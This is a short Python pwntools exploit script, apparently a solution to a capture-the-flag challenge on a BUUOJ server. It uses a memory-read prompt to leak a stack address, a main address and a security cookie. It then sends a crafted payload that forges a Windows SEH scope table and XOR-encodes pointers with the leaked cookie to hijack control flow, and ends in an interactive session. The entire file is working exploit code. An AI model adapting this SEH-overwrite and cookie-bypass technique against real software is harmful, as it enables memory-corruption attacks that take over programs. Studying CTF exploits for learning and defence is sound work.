#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *

# context.log_level = 'debug'
context.arch = 'i386'

sh = remote('node3.buuoj.cn',27654)

def get_value(addr):
    sh.recvuntil('Do you want to know more?')
    sh.sendline('yes')
    sh.recvuntil('Where do you want to know')
    sh.sendline(str(addr))
    sh.recvuntil('value is ')
    return int(sh.recvline(), 16)

sh.recvuntil('stack address =')
result = sh.recvline()
stack_addr = int(result, 16)
log.success('stack_addr: ' + hex(stack_addr))
sh.recvuntil('main address =')
result = sh.recvline()
main_address = int(result, 16)
log.success('main_address: ' + hex(main_address))

security_cookie = get_value(main_address + 12116)
log.success('security_cookie: ' + hex(security_cookie))

# pause()
sh.sendline('n')
next_addr = stack_addr + 212
log.success('next_addr: ' + hex(next_addr))

SCOPETABLE = [
    0x0FFFFFFFE,
    0,
    0x0FFFFFFCC,
    0,
    0xFFFFFFFE,
    main_address + 733,
]
payload = 'a' * 16 + flat(SCOPETABLE).ljust(104 - 16, 'a') + p32((stack_addr + 156) ^ security_cookie) + 'c' * 32 + p32(next_addr) + p32(main_address + 944) + p32((stack_addr + 16) ^ security_cookie) + p32(0) + 'b' * 16
sh.sendline(payload)

sh.recvline()
sh.sendline('yes')
sh.recvuntil('Where do you want to know')
sh.sendline('0')

sh.interactive()